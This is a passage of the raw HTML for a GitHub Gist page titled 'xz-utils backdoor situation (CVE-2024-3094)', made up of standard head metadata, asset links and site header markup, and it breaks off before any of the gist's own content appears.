





<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >



  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-0cfd1fd8509e.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-d782f59290e2.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-f9fbc4b99a77.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-cff1c9b27b1a.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-70097f75aec1.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-c2f0d49bdcd9.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-4747d7bc0bc4.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-d3f6a61c91c8.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-a188d53f44bb.css" />

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-953961b66e63.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-20f98ef38fd8.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-7e1d0e4dee6a.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e72829f5538b.css" />
  

  


  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alive_longer_retries","bypass_copilot_indexing_quota","copilot_new_references_ui","copilot_beta_features_opt_in","copilot_chat_retry_on_error","copilot_chat_persist_submitted_input","copilot_conversational_ux_history_refs","copilot_editor_upsells","copilot_free_limited_user","copilot_implicit_context","copilot_no_floating_button","copilot_smell_icebreaker_ux","experimentation_azure_variant_endpoint","failbot_handle_non_errors","geojson_azure_maps","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","hovercard_accessibility","issues_react_remove_placeholders","issues_react_blur_item_picker_on_close","marketing_pages_search_explore_provider","react_keyboard_shortcuts_dialog","remove_child_patch","sample_network_conn_type","site_metered_billing_update","site_copilot_free","lifecycle_label_name_updates"]}</script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-278066c97335.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_ariaNotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-71291b73d826.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-7b93e0f0c8ff.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-ea2a5d75d580.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-c6d035fa8dc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-f991cfab5105.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-3b5362d3d402.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-7f43298e364b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-833249ee3034.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-863ef5872a03.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-917d4bda1f1a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-7cbef09a422c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-d0d0a6-b41aeef03499.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-fb43816ab83c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-999d1d44cef0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-cfcd9f4f0f23.js"></script>
  
  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_hotkey_dist_index_js-524e40420665.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_remote-form_dist_-d0eef7-5f58a29a0546.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_form-utils_form-utils_ts-ui_packages_input-navigation-behavior_input-navigation-b-a97423-0ee33bdc7197.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_diffs_blob-lines_ts-app_assets_modules_github_diffs_linkable-line-n-b8c0ea-be4e711b7e28.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/gist-7ae34499530e.js"></script>


  <title>xz-utils backdoor situation (CVE-2024-3094) · GitHub</title>



  <meta name="route-pattern" content="/:user_id/:gist_id(.:format)" data-turbo-transient>
  <meta name="route-controller" content="gists_gists" data-turbo-transient>
  <meta name="route-action" content="show" data-turbo-transient>

    
  <meta name="current-catalog-service-hash" content="56253a530ab9027b25719525dcbe6007461a3202218f6f5dfce5a601c121cbcb">


  <meta name="request-id" content="ADF0:13700F:CFCC8E:FCFA47:6781E81D" data-pjax-transient="true"/><meta name="html-safe-nonce" content="18bb4f4b7997f0b7dd0f4843612310ea8d508a464d6df62ab31644193f02f1b3" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiJBREYwOjEzNzAwRjpDRkNDOEU6RkNGQTQ3OjY3ODFFODFEIiwidmlzaXRvcl9pZCI6IjIwODU5MjIzMzI5OTk3NDM3NzQiLCJyZWdpb25fZWRnZSI6Im5lLTAxIiwicmVnaW9uX3JlbmRlciI6Im5vcnRoZXVyb3BlIn0=" data-pjax-transient="true"/><meta name="visitor-hmac" content="9f5fe1730cdb5ce393e0179ab794e5de9b4af1764650a30409f1a91d3ced7225" data-pjax-transient="true"/>




  <meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="gist_code" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="xz-utils backdoor situation (CVE-2024-3094). GitHub Gist: instantly share code, notes, and snippets.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch-gist.xml" title="Gist">

    <link rel="fluid-icon" href="https://gist.github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27" />

      <meta name="twitter:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="xz-utils backdoor situation (CVE-2024-3094)" /><meta name="twitter:description" content="xz-utils backdoor situation (CVE-2024-3094). GitHub Gist: instantly share code, notes, and snippets." />
  <meta property="og:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta property="og:image:alt" content="xz-utils backdoor situation (CVE-2024-3094). GitHub Gist: instantly share code, notes, and snippets." /><meta property="og:site_name" content="Gist" /><meta property="og:type" content="article" /><meta property="og:title" content="xz-utils backdoor situation (CVE-2024-3094)" /><meta property="og:url" content="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27" /><meta property="og:description" content="xz-utils backdoor situation (CVE-2024-3094). GitHub Gist: instantly share code, notes, and snippets." /><meta property="article:author" content="262588213843476" /><meta property="article:publisher" content="262588213843476" />
  




      <meta name="hostname" content="gist.github.com">



        <meta name="expected-hostname" content="gist.github.com">


  <meta http-equiv="x-pjax-version" content="b6d271ea4c4be2122891e67fa7f4ae1c9160fc654c74b27b2102cce3baf5a142" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="ace39c3b6632770952207593607e6e0be0db363435a8b877b1f96abe6430f345" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="91684edb2a1719c4c35d97255f97853f94708cdd9a7c3a773ae63c57032ce418" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="cada3c8d9f0d3df6b8c249a94478caac54d306f7853b81b07da44afdbf8c1fad" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <link href="/thesamesam.atom" rel="alternate" title="atom" type="application/atom+xml">


  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/gist-4afe775cc576.css" />




    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />



  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
      


    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-eb226383faf4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-85b0640cddc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-2131e17288a8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryClient_js-e6f07a7e80b7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-37e3d5-92730c05e718.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-fecaee5fb732.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-958cae8ecd6c.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.491a1e189efd351d2e8c.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>




      

            <div class="Header js-details-container Details flex-wrap flex-md-nowrap p-responsive" role="banner" >
  <div class="Header-item d-none d-md-flex">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 .133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

  <div class="Header-item d-md-none">
      <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="Header-link js-details-target btn-link">    <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-three-bars">
    <path d="M3.75 5.25a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Z"></path>
</svg>
</button>  </div>

  <div class="Header-item Header-item--full js-site-search flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div class="header-search flex-self-stretch flex-md-self-auto mr-0 mr-md-3 mb-3 mb-md-0">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="position-relative js-quicksearch-form" role="search" aria-label="Site" data-turbo="false" action="/search" accept-charset="UTF-8" method="get">
      <div class="header-search-wrapper form-control input-sm js-chromeless-input-container">
        <input type="text"
          class="form-control input-sm js-site-search-focus header-search-input"
          data-hotkey="s,/"
          name="q"
          aria-label="Search"
          placeholder="Search…"
          autocorrect="off"
          autocomplete="off"
          autocapitalize="off">
      </div>

</form></div>


    <nav aria-label="Global" class="d-flex flex-column flex-md-row flex-self-stretch flex-md-self-auto">
  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to all gists, text:all gists" href="/discover">All gists</a>

  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to GitHub, text:Back to GitHub" href="https://github.com">Back to GitHub</a>

    <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="99eecb0bd40e2e0a4b06ef77c97b389a773ce4c131e87956995f1a72c1157311" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27">
      Sign in
</a>
      <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="78207fa823ed1315687eb334df87df66115b6f30498c9325ea5f16d50e810538" href="/join?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27&amp;source=header-gist">
        Sign up
</a></nav>

  </div>

  <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 